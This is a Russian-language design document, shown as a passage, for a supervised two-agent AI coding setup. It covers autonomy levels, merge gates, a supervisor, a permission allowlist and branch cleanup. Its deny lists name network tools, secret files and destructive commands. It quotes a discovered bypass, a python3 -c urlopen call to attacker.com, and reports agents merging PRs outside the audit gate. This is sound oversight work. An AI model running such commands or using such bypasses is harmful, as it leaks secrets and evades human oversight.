| | перезапуск упавшего агента | подтверждение разрешений | закрытие раунда |
|---|---|---|---|
| `auto` (по умолчанию) | да | только белый список | нужно доказательство; слова не надо — раунд может закрыться сам |
| `semi` | да | только белый список | нужно доказательство **и** слово человека: `bin/pairctl ok` |
| `observe` | нет | нет | нужно доказательство; слова человека не надо |

Заметь: `observe` гейты **не** выключает. Ранняя версия возвращала пустой список
блокеров первой же строкой, и `observe` оказывался единственным режимом, где раунд
закрывался вообще ни на чём, — и это выглядело побочным эффектом, а не решением.
`observe` значит «делать меньше», а не «не считать». Доказательство требуется в любом
режиме; различаются только слово человека и перезапуск.

`pair_state` отдаёт `autonomy` и `autonomy_meaning`, а также `closing_blocked_by` —
список причин, по которым `done` прямо сейчас невозможен. Агент обязан увидеть причину,
прежде чем тратить ход на заведомый отказ.

Неизвестное значение `autonomy` (из состояния, записанного более новой сборкой)
читается как `observe`: чужое состояние не должно выдавать этой сборке больше прав,
чем просил человек. **Отсутствующий** ключ — другое дело: это старый файл состояния,
а не просьба осторожничать, и он читается как `auto` — дефолт, заданный человеком.

#### 10b.1. Выбор уровня один раз, при старте

Пара стартует один раз и дальше работает без присмотра, пока результат не окажется
на столе. Уровень выбирается в этот момент и не пересматривается посреди раунда,
поэтому человека спрашивают **не более одного раза**, а в `auto` — вообще не спрашивают.

`bin/pair-duo` принимает `--autonomy observe|semi|auto`, а `--auto`, `--semi` и
`--observe` — сокращения того же. Значение проверяется **до** старта tmux: плохое
значение — ошибка использования (`exit 2`), а не переход к следующему источнику —
опечатка, молча проигнорированная после запуска, оставила бы пару работать не на том
уровне, который выбрал человек, а узнать об этом можно было бы только по факту.

Без флага `bin/pairctl launch-autonomy` решает в таком порядке, сильный первым:

| источник | как выглядит | сильнее |
|---|---|---|
| `task` | `autonomy: semi` на **первой строке** задачи | файла |
| `file` | `.pair/autonomy`, одно слово | дефолта |
| `default` | `auto` | — |

Источник путешествует вместе со значением в транскрипт как `via=flag|task|file|default`.
Уровень, за который нечем отчитаться, потом становится спором: «почему этот раунд
закрыл себя сам?» не имеет ответа, если причина не записана в момент решения.

Строка задачи обязана **начинать** задачу, а не просто встречаться в ней — иначе слова
«перенеси этот текст про autonomy: semi» тихо понизили бы пару. Кривая строка задачи или
файл переходят к следующему источнику вместо провала запуска: отказ стартовать хуже,
чем старт на уровне, который человек видит в `pairctl status`.

`pairctl ok` значит конкретное: считается только сказанным на `verify` или `done`,
последнее слово побеждает, а `bin/pairctl ok --revoke` забирает его обратно. «Одобряю план»
и «изменения проверены» — разные высказывания, а гейт раньше считал их одним. Отзыв
существует потому, что человек, посмотревший, сказавший ok, а затем увидевший новое
изменение, никак не мог взять слово назад. Откат фазы тоже аннулирует слово: оно было
дано о том, чего человек с тех пор уже не видит.

§12 вне всех этих осей. Секреты, порты, деплои, миграции, удаление данных
и истории git останавливают пару на любом уровне, включая `auto`.

`bin/pairctl reset --yes` оставляет автономность на **`auto`**, дефолте. Ранняя
версия оставляла `observe` из рассуждения, что стирание состояния не должно повышать
права, — но права измеряются относительно дефолта, а дефолт человек назначил `auto`.
Оставленный `observe` останавливал пару против «работай сам и вернись с результатом»
и заставлял человека замечать. §12 вне этой оси, так что `auto` никогда не значит
«разрушительная работа разрешена».

### 10c. Человекочитаемые сообщения: одна мысль, причина «почему»

Коммит — одна мысль: заголовок ≤72 символов, повелительное
(`fix(pair): heartbeat last_seen on every call`, а не «fixed/чинит»).
Тело говорит ПОЧЕМУ, а не ЧТО — что видно в диффе. Нет «почему» — не коммить,
сначала допиши.

Запрещённые слова в сообщениях: `comprehensive`, `robust`, `leverage`, `seamless`,
`cutting-edge`, `delve`, `tapestry`, `«в современном мире»`. Список растёт
на месте — новые записи попадают сюда, в §10c, а не в боковой файл, который
удалит закрытая карточка.

Заметки: одна запись — один факт, решение или вердикт. Простыня длиннее 30 строк
режется на отдельные записи plan/finding/decision. Дубли одной мысли разными словами
удаляются, остаётся точная.

Комментарии в коде говорят только почему так, а не иначе, со ссылкой на измерение
или карточку. Пересказ кода словами запрещён.

Критик ревьюит сообщения как код: слоп в коммите — обоснованное возражение,
как за код.

### 10d. Потолок бюджета раунда: лимиты на машинные метрики

`bin/pairctl budget [--reset] [--json]` — машинно-проверяемые лимиты активного раунда для предотвращения бесконечных циклов и неконтролируемой автономии.

Метрики строго машинно-верифицируемы (без самодекларируемых токенов):
- `messages`: общее число событий `send` и `deliver` в `transcript.jsonl` с момента открытия текущего раунда.
- `advances`: количество событий смены фаз `advance` в текущем раунде.
- `hours`: астрономическое время (wall-clock), прошедшее с открытия раунда.
- `restarts`: количество перезапусков супервизором процессов ролей из `.pair/.restarts-*`.

Значения по умолчанию настраиваются или переопределяются через `.pair/budget.json`:
```json
{
  "max_messages": 200,
  "max_advances": 10,
  "max_hours": 24.0,
  "max_restarts": 10
}
```

Инварианты (§10d, §12):
1. **`done` никогда не блокируется**: Завершение раунда в `done` всегда разрешено для исключения дедлоков при исчерпании лимитов.
2. **Шаги назад никогда не блокируются**: Откат фазы (`implement → plan`, `verify → implement`) разрешён всегда.
3. **Связь никогда не блокируется**: Инструмент `pair_send` доступен даже при превышении потолка бюджета.
4. **Блокировка движения вперёд при исчерпании**: Только переходы фаз вперёд (`plan → implement`, `implement → verify`) отклоняются ошибкой `ProtocolError`.
5. **Сброс и свежий раунд**: Сброс выполняется через `bin/pairctl budget --reset` (создаёт `.pair/budget-reset.json`) или автоматически при открытии нового раунда.

### 10e. Гейт намерений и квитанция задачи

1. **Гейт намерений (Intent Gate: `scoping → plan`)**:
   Переход из `scoping` вперёд в `plan` требует артефакта намерений `.pair/intent.md`.
   Файл обязан начинаться со строки `round: N` и содержать три обязательные секции:
   - `Problem` (или `Проблема`) — первопричина или мотивация задачи.
   - `Scope` (или `Границы`) — чёткое разграничение того, что входит и не входит в задачу.
   - `Outcome` (или `Ожидаемый результат`) — критерии приёмки и артефакты поставки.
   Откат назад или повторное открытие после `done` никогда не блокируются.

2. **Квитанция задачи (Task Receipt: `.pair/RECEIPT-<round>.md`)**:
   При переходе в `done` сервер автоматически формирует машинную квитанцию выполнения раунда:
   - Номер раунда, время закрытия, сводка задачи.
   - Активный писатель и участвующие роли.
   - Задачи, закрытые за раунд.
   - Зафиксированные свидетельства (результаты тестов, диффы, коммиты).
   - Финальные метрики бюджета раунда (число сообщений, смен фаз, часов, перезапусков).

### 10f. Петля самовосстановления: `pair-heal`

При регистрации негативного свидетельства (`ok=false`) фоновым процессом или соседом на закрытом раунде (`phase == "done"`):
1. Сервер автоматически запускает heal-reopen: фаза переключается `done → implement`, а номер `round` инкрементируется на 1.
2. В список задач добавляется задача исправления `#<id>: auto-heal: <kind> failed — <value>`.
3. Событие `heal_reopen` записывается в `transcript.jsonl`.
4. Защита от флаппинга: лимит подряд идущих попыток автовосстановления (`MAX_HEAL_ATTEMPTS = 3`). Превышение потолка останавливает автопереоткрытие и требует вмешательства человека.

### 10g. Машинный гейт слияния PR и Feature Freeze

Слияние PR защищено машинными проверками, а не договорённостями в промптах:

1. **Санкционированный путь: `bin/pairctl pr merge [pr_id] [--force] [--reason REASON]`**:
   Это единственный протокольно-валидный путь слияния. Прямой `gh pr merge` из шелла —
   нарушение протокола: он работает вне процесса сервера, и никакое машинное правило
   изнутри репозитория не может его отклонить — пятнадцать слияний ушли так при нуле
   событий `pr_merge` в транскрипте, прежде чем кто-то заметил (раунд 91). GitHub Branch
   Protection (обязательные CI + approving review на `master`, настройка репозитория,
   которой владеет человек) — единственный слой, который останавливает его физически;
   это правило — слой договора, а транскрипт (`pr_merged` / `pr_merge_forced`) — след аудита.
2. **Слияние требует свежего APPROVED критика; NEEDS WORK отклоняет.**
   Гейт читает последнюю вердикт-заметку (`verdict` или слак `verdict-*`, текст из её
   собственного `notes/<slug>.md`) — и решает НОВЕЙШАЯ ПОМЕЧЕННАЯ секция `## `
   (`review_gate.py`: новейший блок с `verdict-approve <sha|round N>`,
   `**APPROVED**` или маркером отказа; непомеченный хвост её не прячет).
   Маркер ставь в ПОСЛЕДНЮЮ секцию своей вердикт-заметки. `**APPROVED**` пропускает,
   `**NEEDS WORK**` отклоняет, голые слова не считаются ни в какую сторону.
   Голый `**APPROVED**` привязывает HEAD через
   саму вердикт-запись (`rev.head` обязан равняться HEAD и быть свежим). Кейс — раунд 91:
   код достиг `master` через пять минут после отказа.
   Вердикт-заметка может нести явный `head` (арг `head` у `pair_note`): запись
   привязывается к этой ревизии, а не к живому дереву (раунд 97 — re-pin после
   пересборки ветки). Якорь — только якорь: свежесть по-прежнему читает содержимое,
   привязка непроверенного дерева остаётся stale; неразрешимый head — громкий отказ.
3. **Условия для слияния (`check_pr_merge`)**:
   - **Фаза**: Строго `verify` (слияние на `implement`, `plan` или `scoping` отклоняется).
   - **Окружение**: Валидный git-репозиторий (fail-closed: "cannot verify: not a git repo").
   - **Свидетельства тестов**: В текущем раунде должно быть успешное свидетельство тестов (`kind="test"`, `ok=True`),
     и это свидетельство обязано называть коммит, на котором его мерили: записанный `head` должен совпадать
     с тем head'ом, который сливается. Запись, привязанная только к раунду, заверяла и все следующие коммиты
     этого раунда: номер раунда не двигается, когда двигается head (раунд 138).
   - **Коммит, который сливается**: гейт спрашивает у GitHub head PR'а (`gh pr view --json headRefOid`) и
     отказывает, если он не равен локальному HEAD. Слияние везёт head PR'а, поэтому гейт, смотревший на
     другой коммит, заверял бы код, который здесь никто не проверял (раунд 138). Нет ответа от GitHub — нет слияния.
   - **Одобрение ревью соседа**: Неустаревший вердикт `approve` (слаг `verdict` или `verdict-*`).
   - **Запрет самоодобрения**: Автор вердикта НЕ должен быть текущим писателем (`verdict.role != store.writer`).
   - **Проверка свежести**: Каноническая проверка `review.is_stale(...)`. Любые правки кода или коммиты после вердикта инвалидируют одобрение.
4. **Feature Freeze**:
   Обеспечивается правилом свежести: после вынесения вердикта одобрения любые последующие коммиты или изменения файлов меняют HEAD или статус dirty, из-за чего `is_stale` возвращает True. Это блокирует и `pairctl pr merge`, и `pair_advance("done")`.
5. **Аудит обхода (`--force`) — санкционированный выход.**
   Мёртвый или отсутствующий критик блокирует любое слияние, а критики умирают. Когда слияние
   не может ждать вердикта, `--force` требует непустой `--reason` И человеческого `pairctl ok`
   за раунд и логируется в `transcript.jsonl` как `pr_merge_forced`. Громко вместо удобно:
   вынужденное слияние видно в следе аудита по построению, а не флаг, который кто-то тихо нашёл.
6. **Ремонт для слияния, уже совершённого вне гейта:**
   `pairctl pr merge-record <pr_id> [--head SHA] [--base BRANCH]`. Команда читает реальное
   состояние на удалёнке, отказывает на не смерженном PR, отказывает на `--head`, который
   расходится с `mergeCommit` от GitHub, и не угадывает, когда сам `gh` упал. На настоящем
   слиянии дописывает `pr_merge_repaired`, называя commit слияния. Ремонт, не способный
   назвать то, что смержил удалёнка, — не ремонт. Раунду 115 он понадобился: ручной
   `gh pr merge` закрыл PR #61, а транскрипт на 456 строк нес ноль merge-событий —
   слияние существовало, аудит репозитория нет.
7. **Ветку следующего раунда режут от свежего `origin/master`.**
   Squash-мерж выбрасывает ветку раунда из истории master, и следующий коммит по ней
   попадает в add/add конфликт — а конфликтный PR нельзя собрать в merge ref, поэтому
   GitHub не показывает ни одного check'а. PR без checks читается как зелёный. Раунд 130
   потерял так ветку: PR #76 был несмерживаем, имел ноль checks и был закрыт. Ветка
   следующего раунда берётся от смерженного master, а не от ветки прошлого раунда.
8. **След слияний проверяется механически.**
   `scripts/merge-audit-trail.py` сверяет PR, смерженные на remote, с записями журнала о
   слияниях — `pr_merged`, `pr_merge_repaired`, `pr_merge_forced`, — и читает как активный
   транскрипт, так и его ротированные архивы. Проверка падает на любом слиянии, о котором
   журнал не знает. Исторический долг назван в `scripts/merge-audit-baseline.tsv` (59 PR, два
   пласта: 1–26 предшествуют гейту, 27–60 — записи журнала о слияниях), и он никогда не
   «лечится» записью события в прошлое — это было бы подделкой журнала. Проверка
   fail-closed: без `gh`, без ответа или без журнала она падает, а не рапортует об успехе.
   Это локальный аудит, а не CI-слой: журнал — состояние пары, а не репозитория. Раунд 139

## 13. Сверхвизор: кто смотрит за парой, пока оба молчат

Агенты по устройству пассивны: отработав шаг, ждут ввода. Пока никто не пишет
другому — пара стоит, и разбудить её может только человек. `bin/pairpilot` —
процесс, который смотрит за парой снаружи и делает ровно семь вещей: отложенная
доставка, подталкивание молчащей роли, подтверждение запроса разрешения **из
белого списка**, перезапуск упавшего агента, сигнал о зависшем патче, дайджест
на чекпоинте и отчёт при закрытии раунда. Вручную его не запускают: `pairup`
(на каждый день, из папки проекта), `pair-duo --pilot` и `finish.sh` (шаг 5)
поднимают его если мёртв и не трогают живого.

И намеренно не умеет: двигать фазу, выдавать или забирать право записи, коммитить,
применять чужие патчи, трогать файлы проекта. Иначе §2 перестаёт быть границей.

`bin/pairctl roster` показывает, кто зарегистрирован; `--prune` убирает то, что
доказуемо ушло, — процесс мёртв, **а** панель либо отсутствует, либо принадлежит
другой живой роли. Одного факта мало: после падения живая панель может оказаться
шеллом, который открыл человек. Prune отказывается убирать держателя права записи,
и каждое удаление попадает в транскрипт. `finish.sh` чистит ростер до запуска,
чтобы свежие агенты не регистрировались поверх записей панелей прошлой сессии.

### 13a. Перезапуск упавшего агента

Только когда: процесс действительно мёртв (pid не отвечает), панель жива,
ни одна живая роль её не делит, автономность не `observe`, команда запуска известна
и троттлинг позволяет.

Команда берётся «явное раньше угаданного»: `--launch role=cmd`,
`PAIR_LAUNCH_<ROLE>`, `.pair/restart.json`, поле `launch` в `cli-profiles.json`.
Нет команды — нет перезапуска, а в транскрипт ложится `pilot_restart_impossible`
с причиной. Выдуманная команда хуже отсутствующей: панель оживает и тут же снова
падает.

**`respawn-pane` запускается без `-k`.** tmux отказывается респаунить живую панель,
и это ровно правильно: после падения агента панель обычно занимает шелл или
отладчик, который открыл человек. Перезапуск бьёт только туда, где панель действительно
мертва, а занятую оставляет человеку с записанным отказом.

Роль возвращается под тем же именем, потому что `install.sh` запекает роль
в MCP-конфиг, а не в память процесса. **Перезапуск не трогает право записи**:
писателем остаётся тот, кого назначил человек. Именно это делает перезапуск
безопасным — он чинит процесс, а не границу доверия.

Перезапуск возвращает процесс, а не память. У вернувшейся роли нет ни задачи, ни
контекста раунда, а общего способа возобновить сессию `agy` или `claude` никто
не знает — поэтому пилот оставляет записку в `.pair/notes/pilot-restart-<role>.md`
со ссылкой на `.pair/tasks.md`, где перечислено оставшееся. Угадывание флага
потребовало бы от профиля знания протокола, а профили его знать не должны.

Молчание и смерть лечатся по-разному, и смешивать их нельзя: молчание — напоминание,
смерть — перезапуск. Живой процесс трогать нельзя — он не потеряет контекст,
пока работает.

Панели, которой нет, не поднимают: окно, закрытое человеком, — решение, а не зависание.

Роль, чей процесс мёртв, не делает панель общей. Проверено вживую: `claude` и
`codex` умерли, а их записи в ростере пережили их, так что `skip` содержал все три
роли включая живую, и супервизор перестал обслуживать проект, потому что два мёртвых
соседа выглядели делящими панель с живым агентом. Протухшая роль объявляется один раз,
потому что именно молчание о ней сделало это невидимым; чистка ростера остаётся
решением человека.

### 13b. Белый список разрешений

`resolve_permission_prompt` подтверждает только совпавшее с белым списком. Список
по умолчанию — не «только чтение»: это работа, которую протокол и так требует без
человека, иначе пара встаёт на каждом шаге.

Разрешено по умолчанию:

- чтение: `Read`, `grep`, `glob`, `ls`, `cat`, `head`, `tail`, `find`;
- правка внутри проекта: `write`, `edit`, `create`, `replace`, `patch`, `apply`,
  `format`, `lint`;
- проверки и сборки: `ruff`, `mypy`, `tsc`, `make`, `npm run`,
  `build`; раннеры тестов (`pytest`, `unittest`, `cargo test`, `bun test`,
  `python3`/`node` с тестом в команде) — ТОЛЬКО изолированно через
  `scripts/run-isolated-test.sh` (контейнер без сети и без `$HOME`),
  прямой запуск на хосте ждёт человека (P0);
- локальный git: `status`, `diff`, `log`, `add`, `commit`, `checkout`, `switch`,
  `branch`, `stash`;
- отправка работы: `git push` в **фиче-ветку** и `gh pr` — §10 требует PR;
- уборка артефактов: `rm -rf build/` с относительной целью.

Запрещено при любом белом списке, проверяется первым:

- **весь §12:** секреты (`.env`, `id_rsa`, `/etc/shadow`, `.pem`, `.npmrc`,
  `.aws`, токены, пароли), порты и деплои (`deploy`, `kubectl`, `helm`,
  `docker`, `terraform`, `ssh`, `sudo`), миграции и разрушение БД
  (`migrate`, `drop table`, `truncate`), прод;
- **разрушение системы:** `rm -rf /`, `rm -rf ~`, `rm -rf .`, `mkfs`, `dd if=`,
  `> /dev/sda`, `killall`;
- **история git:** push в `main`/`master`, `--force`, `reset --hard`, `clean -f`,
  `filter-branch`, `reflog expire` — §10 и §12;
- **сеть и установка пакетов:** `curl`, `wget`, `nc -`, `pip install`,
  `npm install`, `npm publish`. Не потому что сеть опасна сама по себе, а потому
  что сеть может вынести то, что защищает §12, а установка пакета тянет в проект
  чужой непроверенный код;
- **труба в шелл:** `| sh`, `| bash`, `$(`, backtick, `xargs`,
  `find … -exec/-delete` — это превращает любое чтение в выполнение;
- **код, переданный интерпретатору строкой:** `python3 -c`, `node -e`. Проверено
  вживую до фикса: `python3 -c "…urlopen('http://attacker.com')" # test` разрешался,
  потому что слово `test` в комментарии удовлетворяло паттерну, а код был произвольным,
  и `urllib` нет в deny-списке — сетевые правила ловят `curl`, `wget` и `nc`,
  а не сетевой модуль языка.

Расширяет человек: `.pair/permissions.json` с `{"allow": ["Read", "git
status"]}`, `PAIR_PERMISSIONS` или `bin/pairpilot --allow 'Read,git status'`.

Три случая держат врозь, потому что их смешение это и ломало: **файла нет вообще** —
значит список по умолчанию: граница, которую провёл человек, внутри репозитория что
нужно работе, а отказано тому, что может навредить машине, другому проекту или что
невосстановимо. **Явно пустая строка** — значит не подтверждать ничего, потому что
так сказал человек. **Файл есть, но сломан** — тоже не подтверждать ничего: оператор
что-то настраивал и опечатался, а молча откатиться на дефолт значило бы тихо выкинуть
его намерение, что хуже остановки.

И это говорится вслух. Пилот записывает `pilot_default_allowlist` раз за прогон,
а сервер — `unblock_default_allowlist` на каждое подтверждение, так что журнал
показывает, какое правило одобрило команду. Это имело значение: файла никогда не
существовало, так что путь к нему стал единственным allow-паттерном, он не совпал
ни с одним промптом, и **супервизор отказывал во всём** — что снаружи неотличимо
от соседа, переставшего помогать.

Отказ — не ошибка, а результат: панель остаётся заблокированной, событие
`pilot_unblock_refused` попадает в транскрипт, а причина — в отчёт.
Причина обязательна: необъяснённое «нет» неотличимо от сломанного супервизора.

**Ограничение, о котором стоит знать.** Решение принимается по тексту строки, а не
по разбору команды: строка может содержать безобидное слово рядом с опасным.
Компенсируют три правила: список по умолчанию ограничен внутренней работой, deny-список
проверяется первым и не переопределяется, а совпадение пишется в транскрипт вместе
со строкой — так что журнал показывает, на что именно было сказано «да».

Тот же список применяют агентский `pair_unblock` и `bin/pairwatch --unblock`.
Оставить дыру с другой стороны значило бы закрыть её наполовину.

**Две формы вопроса.** Не все агенты спрашивают `[y/N]`. TUI opencode показывает
меню — `Allow once · Always allow · Reject` с подвалом `⇆ select  enter confirm`.
Различия существенны, и обе обрабатываются:

| | `[y/N]` | меню |
|---|---|---|
| как определяется | `PERMISSION_PATTERNS`, две последние строки | заголовок `Permission required` **и** признаки меню |
| по чему выносится вердикт | по строке вопроса | по всей модалке — команда в теле (`$ git status`), а не в заголовке |
| что нажимается | `y`, затем `Enter` | только `Enter` |
| проверка композера | да | нет: в модалке нет строки ввода |

`y` в этом TUI не значит согласия, поэтому не отправляется. Вердикт по одному заголовку
отказывал бы во всём — в нём нет ни одного слова из белого списка, — то есть разрешение
в меню молча перестало бы работать. `Permission required` в обычном выводе — не вопрос:
нужны оба признака сразу.

Для `[y/N]` вердикт читает и несколько строк выше вопроса (`OVERSCAN_LINES`), потому что
Claude Code печатает команду на предпоследней строке, а вопрос последним, — чтение одного
вопроса отказывало в 100% безопасных команд, так что `auto` на этом CLI не работал.
Потолок существует, чтобы одобрение нельзя было получить словом издалека сверху экрана.

### 13c. Свой deny-список важнее супервизора

У каждого CLI есть собственный механизм запретов, и он срабатывает **раньше** любого
нашего. Для OpenCode это `permission` в `opencode.jsonc` и флаг `--auto`: в авто-режиме
запросы, явно не запрещённые, подтверждаются сами, а правила `"deny"` действуют всегда.

```jsonc
{
  "permission": {
    "bash": {
      "*": "allow",
      "sudo *": "deny", "curl *": "deny", "wget *": "deny",
      "pip install *": "deny", "npm install *": "deny", "npm publish *": "deny",
      "ssh *": "deny", "docker *": "deny", "kubectl *": "deny",
      "terraform *": "deny", "helm *": "deny", "mkfs*": "deny", "killall *": "deny",
      "git push *main*": "deny", "git push *master*": "deny", "git push --force*": "deny",
      "git reset --hard *": "deny", "git clean -f*": "deny", "git filter-branch*": "deny"
    },
    "read": {
      "*": "allow",
      "*.env": "deny", "*.env.*": "deny", "*.env.example": "allow",
      "**/.ssh/*": "deny", "**/id_rsa*": "deny", "**/*.pem": "deny", "**/*.key": "deny",
      "**/.npmrc": "deny", "**/.aws/*": "deny", "**/.git-credentials": "deny"
    }
  }
}
```

Звёздочки здесь — собственный синтаксис opencode, а не наш: правила применяются по порядку,
и последнее совпавшее побеждает, поэтому `"*": "allow"` идёт первым.

Почему это лучше белого списка супервизора, а не рядом с ним:

- **срабатывает раньше.** CLI вообще не показывает диалог, поэтому агент не стоит и
  супервизору не нужно решать, нажимать ли Enter;
- **обязателен.** `"deny"` действует в том числе в авто-режиме, то есть опечаткой
  в белом списке его не пережить;
- **читает человек.** Правила лежат в его конфиге, рядом с настройками модели,
  а не внутри инструмента, который мы сопровождаем.

Поэтому `launch` для OpenCode содержит `--auto`: агент перестаёт вставать на каждом шаге, а
граница держится на `deny`, который человек видит и может изменить.

## 18. Диагностируй по дереву, а не по своему инструменту

Диагноз, который не может ошибиться, — не измерение. Раунд 115 назвал цену:
omp два часа гонялся за дефектом, которого не существовало, и записал карточку
в backlog, предлагая следующему агенту ловить тот же фантом.

Что произошло. Проверяя отказ ack, omp построил `Store(Path('.'))` там, где
корнем был задуман `Path('.pair')`. `state_path` стал `./state.json`, которого
нет, поэтому `_load` вернул `default_state()` — пустые `seen` и
`pending_reads`. Цепочка `.get()` вернула `None` там, где ожидалось значение, и
этот `None` прочли как находку. Два прямых прогона затем противоречили
карточке прямо на экране — оба зелёные, — и оба прочли как «файл изменился подо
мной», а не «я передал не тот путь».

Правила, которые из этого следуют, каждое оплачено один раз:

1. **Неверный корень — ошибка вызывающего, а не пустая пара.** `Store.__init__`
   отказывает каталогу без `state.json`, называя и путь, что пробовал, и соседа
   `.pair`, который почти наверняка и подразумевался (`store_core.py`). Корень
   ошибки — почти всегда недостающий суффикс, поэтому его и называют.
2. **`None` из `dict.get()` там, где ожидалось значение, заканчивает опыт, а не
   начинает.** Заставь его упасть. `None`, которого ты не предсказывал, уже
   уничтожил смысл прогона.
3. **Когда два пути дают разный ответ — сравнивай их входы, прежде чем
   теоретировать**: путь, объект, класс. Не кэш и не гонки: сначала пути.
4. **Зелёный прогон, противоречащий гипотезе, — это доказательство о гипотезе.**
   Два зелёных результата с «неправильным» ответом означают, что неверен
   инструмент, а не дерево. Перечитай инструмент, прежде чем что-либо записывать.
5. **Область прогона — часть заявления.** `pytest mcp/pair_mailbox/` — это не
   проект. Раунд 115 был зелёным локально и красным в CI, потому что CI гоняет
   `scripts/verify-project.sh`, который покрывает install, pilot и supervisor
   suites, до которых узкий путь не доходит. Гоняй то, что поставляется.

Карточка, поданная из этого класса, хуже её отсутствия: она тратит время
следующего агента на фантом, который произвёл сама.

## 19. Один ствол, короткие ветки раундов и карточка раунда, которую читает новичок

Решено обоими агентами 2026-10-18 (предложил omp, утвердил agy), после того как
человек задал два вопроса, на которые репозиторий не мог ответить: *в какую ветку
целят раунды* и *почему смерженные ветки раундов остаются в origin*. Оба вопроса
заданы потому, что свежий клон продолжал получать некурируемый репозиторий.

### Модель ветвления: стволовая

1. **`master` — единственная длинноживущая ветка.** Ни `develop`, ни `dev`, ни
   release-ветки. Ветка, пережившая свой раунд, — это ветка, которая будет гнить
   молча: `origin/dev` создан в раунде 113, не упомянут ни в одном документе в
   `docs/`, а к раунду 115 все пять затронутых им файлов были байт-в-байт
   идентичны master'у — мёртвый дубль, а не очередь работы.
2. **Ветка раунда живёт ровно столько, сколько раунд.** Существует от первого
   коммита раунда до его мержа и не дольше. Имя остаётся `round-<N>-<slug>`.
3. **Мерж удаляет ветку — санккционированным путём.** §10g уже называет
   `bin/pairctl pr merge` единственным протокольно-валидным мержем; он мержит с
   `--delete-branch`, так что смерженная ветка `round-*` исчезает по конструкции,
   а не по чьей-то памяти. Ручной `gh pr merge`, оставляющий ветку, берёт на себя
   обязательство по уборке, которого он не видит.
4. **Аудит-след — это git, а не список ветвей.** История раунда живёт в
   сообщениях коммитов и в PR; список веток в origin не несёт ничего, чего нет в
   логе. Две смерженные ветки, оставленные в `origin`, — два ложных утверждения о
   том, где лежит работа.

### Карточка раунда: память переживает клон

1. **Каждый закрытый раунд оставляет один трекнутый файл: `docs/rounds/<N>.md`.**
   Не двадцать — один. Он фиксирует, что было не так, что сделано с измеренными
   числами, что сломалось и сколько это стоило, и что осталось незакрытым.
2. **Это существует потому, что `.pair/` в `.gitignore`, и так и должно быть.**
   Он несёт рантайм — почту, патчи, бюджет, шесть десятков реквизитов; всё это
   одноразово и не дело посторонних. Но именно поэтому *обоснование* раунда в
   клоне невидимо. Карточка раунда — та часть обоснования, которую стоит
   сохранить, перенесённая в трекнутый путь вручную, при закрытии.
3. **Реквизит ссылается на карточку, а не прочь от неё.** Автоматический
   `RECEIPT-<round>.md` из §10e остаётся машинным и лежит в `.pair/`; карточка
   раунда — его публичное лицо. Ссылаться в обе стороны.
4. **Раунд, закрытый без карточки, не закончен.** Это пункт чеклиста закрытия,
   которого §10e был должен и не имел.

## 20. Классы веток и janitor, которому позволено удалять только доказанно смерженное

Решено обоими агентами 2026-10-18 (omp предложил, agy поправил и свердиктовал),
после вопроса человека, на который §19 не отвечала: *эта модель написана под
двух агентов в одном репо — как она работает в репо, где трусят также
ревизоры, тимлиды и обычные разработчики?* §19 называет один ствол и одну
смертную ветку раунда. Человеческому репо нужны вердикты про ветки, чьи имена не
`round-*` и которые живут дольше одного PR намеренно.

§19 остаётся в силе. §20 уточняет: что делает класс ветки машинно-читаемым, и
что дозволено чистильщику на основании одного только класса.

### Почему класс обязан читаться из имени

1. **На GitHub единственный машинно-читаемый признак класса — fnmatch-паттерн
   имени.** Branch protection и rulesets матчат имена (`master`, `release-*`,
   `users/*`). Метки и состояние PR — дополнение, не упрощение: читать их — это
   превращать каждую проверку в сетевой вызов, а горячие пути этого не терпят
   (`mcp/pair_mailbox/review.py` ходит только по локальным refs и говорит об
   этом).
2. **`Automatically delete head branches` — настройка репозитория, и она слепа к
   именам.** Она удалит любую head-ветку после мержа её PR — включая
   стратегическую, если та не защищена `do not allow deletions`. Значит
   настройка безопасна только тогда, когда класс, который обязан выжить, защищён
   по имени, а это возвращает reasoning к правилу 1.
3. **Следовательно: ветка, класс которой не читается из имени, — ветка, которую
   никакое правило защитить не может.** Это не пристрастие к именованию, а цена
   любой автоматической чистки вообще. Неназванный класс — это janitor, который
   догадывается.
4. **`dev`, `develop`, `integration`, `staging` — накопители — названы здесь
   антипаттерном.** Ветка, чья работа собирать другие ветки, сгниёт молча:
   `origin/dev` лежал с раунда 113, пять файлов байт-в-байт как `master`, и ни
   одного упоминания в `docs/`. Исключения «но это наша интеграционная ветка» не
   существует: §19 rule 1 уже удалила её однажды.

### Классы

| класс | имя | время жизни | роботу удалять? | защита |
|---|---|---|---|---|
| ствол | `master` | всегда | **никогда** | защищён; прямых пушей нет (локальный хук, `bin/git-hooks/pre-push`) |
| стратегический | `release/*`, `support/*` | дольше одного PR | **никогда** | `do not allow deletions`; удаление только руками, с причиной, с записью |
| смертный | `round-*`, `feature/*`, `fix/*`, `hotfix/*`, `chore/*` | один PR, умирает с мержем | **только когда PR MERGED** | не требуется |
| личный | `users/<name>/*` | авторский, в ствол не идёт | **никогда** — свипа по TTL отчитывается, решает человек | не требуется |
| аномалия | всё прочее | — | **никогда** | попадает в отчёт |

Две поправки к первому импульсу, обе от критика:

- **`hotfix/*` — смертный, не стратегический.** Hotfix чинит один инцидент и
  закрывается через PR; `hotfix_trailer_check` в `review.py` уже требует
  трейлер `follows: PR #N` на каждом коммите после base раунда на
  origin/master — это жизненный цикл смертной ветки, записанный в коде.
  Стратегический означает *линию поддержки*: релиз, который месяцами принимает
  cherry-pick'и.
- **Личные ветки в ствол не мержаются, поэтому никогда не цель чистки.** Свип
  может отрапортовать их как stale по возрасту; удалять нельзя, потому что
  «stale» — утверждение о чьей-то незаконченной мысли.

### Контракт janitor (fail-closed в каждой ветви)

1. **Janitor удаляет только то, что доказал смерженным.** Доказательство —
   состояние `gh pr view` == MERGED (или достижимость от ref ствола), никогда
   имя, никогда возраст ветки, никогда «PR вроде закрыт». Форма та же, что у
   `pairctl pr merge-record`: прочитать remote, отказать при несовпадении,
   отказать когда `gh` упал — `mcp/pair_mailbox/review_gate.py`.
2. **Ствол и стратегические роботом не удаляются никогда.** Без исключений, без
   `--force`, без «только один раз».
3. **Смертная ветка, смерженность которой не доказана, попадает в отчёт, а не в
   удаление.** CLOSED-несмерженные и брошенные возвращаются человеку как STALE.
   Удаление закрытой-но-несмерженной ветки уничтожает единственную копию работы,
   которую репо не приняло.
4. **Неузнанное имя — ANOMALY, и никогда не кандидат на удаление.** Аномалия
   значит, что контракт именования сломан выше по течению; janitor, который
   «сердечно» прибирает аномалии, учит всех именовать плохо.
5. **Каждое удаление janitor'а записывается с тем, что он знал: имя ветки, SHA
   головы, id PR и доказательство, на которое опирался.** Никаких молчаливых
